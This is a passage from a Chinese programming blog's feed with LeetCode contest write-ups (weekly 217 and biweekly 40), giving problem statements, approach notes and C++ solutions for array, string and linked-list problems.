class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr1;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr2;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt(<span class="number">2</span>*limit+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n/<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            arr1.push_back(min(nums[i],nums[n<span class="number">-1</span>-i]));</span><br><span class="line">            arr2.push_back(max(nums[i],nums[n<span class="number">-1</span>-i]));</span><br><span class="line">            cnt[nums[i]+nums[n<span class="number">-1</span>-i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr1.begin(),arr1.end());</span><br><span class="line">        sort(arr2.begin(),arr2.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit*<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it1 = lower_bound(arr1.begin(),arr1.end(),i);</span><br><span class="line">            <span class="keyword">auto</span> it2 = lower_bound(arr2.begin(),arr2.end(),i-limit);</span><br><span class="line">            <span class="keyword">int</span> upper = arr1.end() - it1;</span><br><span class="line">            <span class="keyword">int</span> lower = it2 - arr2.begin();</span><br><span class="line">            <span class="keyword">int</span> move = upper + lower + n/<span class="number">2</span> - cnt[i];</span><br><span class="line">            ans = min(ans,move);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>前缀和：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="keyword">int</span> upper = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> lower = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; lo(limit+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; hi(limit+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tot(limit*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n/<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            lo[min(nums[i],nums[n<span class="number">-1</span>-i])]++;</span><br><span class="line">            hi[max(nums[i],nums[n<span class="number">-1</span>-i])]++;</span><br><span class="line">            tot[nums[i]+nums[n<span class="number">-1</span>-i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = limit<span class="number">-1</span>; i &gt;= <span class="number">1</span>; --i) lo[i] += lo[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit; ++i) hi[i] += hi[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit*<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> upper = i &gt; limit ? <span class="number">0</span>:lo[i];</span><br><span class="line">            <span class="keyword">int</span> lower = i &lt;= limit ? <span class="number">0</span>:hi[i-limit<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">int</span> move = upper + lower + n/<span class="number">2</span> - tot[i];</span><br><span class="line">            ans = min(ans,move);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>差分数组:<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; delta(limit * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> lo = <span class="number">1</span> + min(nums[i], nums[n - i - <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">int</span> hi = limit + max(nums[i], nums[n - i - <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">int</span> sum = nums[i] + nums[n - i - <span class="number">1</span>];</span><br><span class="line">            delta[lo]--;</span><br><span class="line">            delta[sum]--;</span><br><span class="line">            delta[sum + <span class="number">1</span>]++;</span><br><span class="line">            delta[hi + <span class="number">1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> now = n;</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit * <span class="number">2</span>; ++i) &#123;</span><br><span class="line">            now += delta[i];</span><br><span class="line">            ans = min(ans, now);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5616-数组的最小偏移量"><a href="#5616-数组的最小偏移量" class="headerlink" title="5616. 数组的最小偏移量"></a>5616. 数组的最小偏移量</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个由<code>n</code>个正整数组成的数组<code>nums</code> 。</p><p>你可以对数组的任意元素执行任意次数的两类操作：</p><ul><li>如果元素是 偶数 ，除以 <code>2</code><br>例如，如果数组是 <code>[1,2,3,4]</code>，那么你可以对最后一个元素执行此操作，使其变成 <code>[1,2,3,2]</code></li><li>如果元素是 奇数 ，乘上 2<br>例如，如果数组是<code>[1,2,3,4]</code> ，那么你可以对第一个元素执行此操作，使其变成 <code>[2,2,3,4]</code><br>数组的 偏移量 是数组中任意两个元素之间的 最大差值 。</li></ul><p>返回数组在执行某些操作之后可以拥有的 最小偏移量 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：你可以将数组转换为 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>]，然后转换成 [<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>]，偏移量是 <span class="number">3</span> - <span class="number">2</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">20</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：两次操作后，你可以将数组转换为 [<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>]，偏移量是 <span class="number">5</span> - <span class="number">2</span> = <span class="number">3</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">10</span>,<span class="number">8</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == nums.length</code></li><li><code>2 &lt;= n &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 109</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们可以首先将所有数字都通过反复除以22变为奇数，然后将这些数都放入一个set中（同时记录下编号以便查询原始值）。为了减小偏移量，我们每次贪心地对最小的元素进行乘22的操作，直到不能再继续进行下去为止（最小的元素已经是偶数，并且等于其原始值）。这个过程中，set中最大元素和最小元素的最小差值就是我们要求的答案。</li><li>我们知道所有的奇数都可以变大，所有的偶数都只能变小。所以如果一个数为偶数的话，我们则可以枚举其所有可能的数，如果一个数原始为奇数，则他最多只可能变一次。</li><li>总感觉这个题目乖乖的，不太清楚考察什么思考能力？<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumDeviation</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="built_in">set</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; ms;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">while</span> (num % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            ms.emplace(num, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = ms.rbegin()-&gt;first - ms.begin()-&gt;first;</span><br><span class="line">        <span class="keyword">while</span> (ms.begin()-&gt;first &lt; nums[ms.begin()-&gt;second] || ms.begin()-&gt;first % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [num, idx] = *ms.begin();</span><br><span class="line">            ms.erase(ms.begin());</span><br><span class="line">            ms.emplace(num &lt;&lt; <span class="number">1</span>, idx);</span><br><span class="line">            ans = min(ans, ms.rbegin()-&gt;first - ms.begin()-&gt;first);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-217&quot;&gt;&lt;a href=&quot;#leetcode-contest-217&quot; class=&quot;headerlink&quot; title=&quot;leetcode   contest 217&quot;&gt;&lt;/a&gt;leetcode   contest 217&lt;/h1&gt;&lt;p&gt;本周周赛难度果真很大，只做出了前2题，后面2题确实很难，基本上没有什么思路。确实是非常经典的&lt;code&gt;cp&lt;/code&gt;题目，偶尔会出现难度很大的题目。&lt;/p&gt;&lt;h2 id=&quot;5613-最富有客户的资产总量&quot;&gt;&lt;a href=&quot;#5613-最富有客户的资产总量&quot; class=&quot;headerlink&quot; title=&quot;5613. 最富有客户的资产总量&quot;&gt;&lt;/a&gt;5613. 最富有客户的资产总量&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个 &lt;code&gt;m x n&lt;/code&gt;的整数网格 &lt;code&gt;accounts&lt;/code&gt;，其中 &lt;code&gt;accounts[i][j]&lt;/code&gt;是第 &lt;code&gt;i​​​​​​​​​​​​&lt;/code&gt; 位客户在第 &lt;code&gt;j&lt;/code&gt; 家银行托管的资产数量。返回最富有客户所拥有的 资产总量 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  双周赛 40</title>
    <link href="http://yoursite.com/2020/11/28/230/"/>
    <id>http://yoursite.com/2020/11/28/230/</id>
    <published>2020-11-28T15:34:15.764Z</published>
    <updated>2020-11-29T05:27:43.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biweekl-contest-40"><a href="#leetcode-biweekl-contest-40" class="headerlink" title="leetcode  biweekl contest 40"></a>leetcode  biweekl contest 40</h1><p>今天的双周赛的题目实在是太简单了，基本上完全没有任何难度，除了题目麻烦容易出错以外，真心特别简单，基本上没有<code>hard</code>难度，题目太没有诚意了,天冷了写代码速度都变慢了。<br><img src="https://i.loli.net/2020/11/28/UL9NKgnJsk78THv.png" alt="1"></p><h2 id="5557-最大重复子字符串"><a href="#5557-最大重复子字符串" class="headerlink" title="5557. 最大重复子字符串"></a>5557. 最大重复子字符串</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个字符串 <code>sequence</code>，如果字符串 <code>word</code> 连续重复<code>k</code>次形成的字符串是 <code>sequence</code> 的一个子字符串，那么单词<code>word</code> 的 重复值为 k 。单词 word 的 最大重复值 是单词 <code>word</code>在 <code>sequence</code> 中最大的重复值。如果 <code>word</code>不是 <code>sequence</code>的子串，那么重复值 k 为 0 。</p><a id="more"></a><p>给你一个字符串 <code>sequence</code>和 <code>word</code>，请你返回 最大重复值 k 。</p><p>示例 1：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">sequence</span> = <span class="string">"ababc"</span>, <span class="attr">word</span> = <span class="string">"ab"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：<span class="string">"abab"</span> 是 <span class="string">"ababc"</span> 的子字符串。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">sequence</span> = <span class="string">"ababc"</span>, <span class="attr">word</span> = <span class="string">"ba"</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：<span class="string">"ba"</span> 是 <span class="string">"ababc"</span> 的子字符串，但 <span class="string">"baba"</span> 不是 <span class="string">"ababc"</span> 的子字符串。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">sequence</span> = <span class="string">"ababc"</span>, <span class="attr">word</span> = <span class="string">"ac"</span></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：<span class="string">"ac"</span> 不是 <span class="string">"ababc"</span> 的子字符串。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= sequence.length &lt;= 100</code></li><li><code>1 &lt;= word.length &lt;= 100</code></li><li><code>sequence</code> 和 <code>word</code> 都只包含小写英文字母</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-40/problems/maximum-repeating-substring/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-40/problems/maximum-repeating-substring/</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>直接将可能的重复的次数都尝试一遍即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxRepeating</span><span class="params">(<span class="built_in">string</span> sequence, <span class="built_in">string</span> word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = sequence.size();</span><br><span class="line">        <span class="keyword">int</span> n = word.size();</span><br><span class="line">        <span class="keyword">int</span> repeat = m/n;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = repeat; i &gt;= <span class="number">1</span>; --i)&#123;</span><br><span class="line">            <span class="built_in">string</span> curr;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j) curr = curr + word;</span><br><span class="line">            <span class="keyword">if</span>(sequence.find(curr) != <span class="built_in">string</span>::npos) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5558-合并两个链表"><a href="#5558-合并两个链表" class="headerlink" title="5558. 合并两个链表"></a>5558. 合并两个链表</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你两个链表 <code>list1</code> 和 <code>list2</code>，它们包含的元素分别为 n 个和 m 个。<br>请你将 <code>list1</code>中第 a 个节点到第 b 个节点删除，并将<code>list2</code>接在被删除节点的位置。</p><p>下图中蓝色边和节点展示了操作后的结果：</p><p>请你返回结果链表的头指针。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：list1 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>], a = <span class="number">3</span>, b = <span class="number">4</span>, list2 = [<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>]</span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>,<span class="number">5</span>]</span><br><span class="line">解释：我们删除 list1 中第三和第四个节点，并将 list2 接在该位置。上图中蓝色的边和节点为答案链表。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：list1 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], a = <span class="number">2</span>, b = <span class="number">5</span>, list2 = [<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>,<span class="number">1000003</span>,<span class="number">1000004</span>]</span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>,<span class="number">1000003</span>,<span class="number">1000004</span>,<span class="number">6</span>]</span><br><span class="line">解释：上图中蓝色的边和节点为答案链表。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>3 &lt;= list1.length &lt;= 104</code></li><li><code>1 &lt;= a &lt;= b &lt; list1.length - 1</code></li><li><code>1 &lt;= list2.length &lt;= 104</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-40/problems/merge-in-between-linked-lists/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-40/problems/merge-in-between-linked-lists/</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 链表</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>简单题型，直接找到第<code>a-1</code>和<code>b+1</code>个节点，分别将其与<code>list2</code>的起点和终点链接起来即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeInBetween</span><span class="params">(ListNode* list1, <span class="keyword">int</span> a, <span class="keyword">int</span> b, ListNode* list2)</span> </span>&#123;</span><br><span class="line">        ListNode * la = list1;</span><br><span class="line">        ListNode * lb = list1;</span><br><span class="line">        ListNode * end = list2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a - <span class="number">1</span>; ++i) la = la-&gt;next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b + <span class="number">1</span>; ++i) lb = lb-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(end-&gt;next) end = end-&gt;next;  </span><br><span class="line">        la-&gt;next = list2;</span><br><span class="line">        end-&gt;next = lb;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> list1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5560-设计前中后队列"><a href="#5560-设计前中后队列" class="headerlink" title="5560. 设计前中后队列"></a>5560. 设计前中后队列</h2><p>请你设计一个队列，支持在前，中，后三个位置的 <code>push</code>和 <code>pop</code> 操作。</p><p>请你完成 <code>FrontMiddleBack</code> 类：</p><ul><li>FrontMiddleBack() 初始化队列。</li><li>void pushFront(int val) 将 val 添加到队列的 最前面 。</li><li>void pushMiddle(int val) 将 val 添加到队列的 正中间 。</li><li>void pushBack(int val) 将 val 添加到队里的 最后面 。</li><li>int popFront() 将 最前面 的元素从队列中删除并返回值，如果删除之前队列为空，那么返回 -1 。</li><li>int popMiddle() 将 正中间 的元素从队列中删除并返回值，如果删除之前队列为空，那么返回 -1 。</li><li>int popBack() 将 最后面 的元素从队列中删除并返回值，如果删除之前队列为空，那么返回 -1 。<br>请注意当有 两个 中间位置的时候，选择靠前面的位置进行操作。比方说：</li></ul><p>将 6 添加到 [1, 2, 3, 4, 5] 的中间位置，结果数组为 [1, 2, 6, 3, 4, 5] 。<br>从 [1, 2, 3, 4, 5, 6] 的中间位置弹出元素，返回 3 ，数组变为 [1, 2, 4, 5, 6] 。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">[<span class="string">"FrontMiddleBackQueue"</span>, <span class="string">"pushFront"</span>, <span class="string">"pushBack"</span>, <span class="string">"pushMiddle"</span>, <span class="string">"pushMiddle"</span>, <span class="string">"popFront"</span>, <span class="string">"popMiddle"</span>, <span class="string">"popMiddle"</span>, <span class="string">"popBack"</span>, <span class="string">"popFront"</span>]</span><br><span class="line">[[], [<span class="number">1</span>], [<span class="number">2</span>], [<span class="number">3</span>], [<span class="number">4</span>], [], [], [], [], []]</span><br><span class="line">输出：</span><br><span class="line">[null, null, null, null, null, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">FrontMiddleBackQueue q = new FrontMiddleBackQueue();</span><br><span class="line">q.pushFront(<span class="number">1</span>);   <span class="comment">// [1]</span></span><br><span class="line">q.pushBack(<span class="number">2</span>);    <span class="comment">// [1, 2]</span></span><br><span class="line">q.pushMiddle(<span 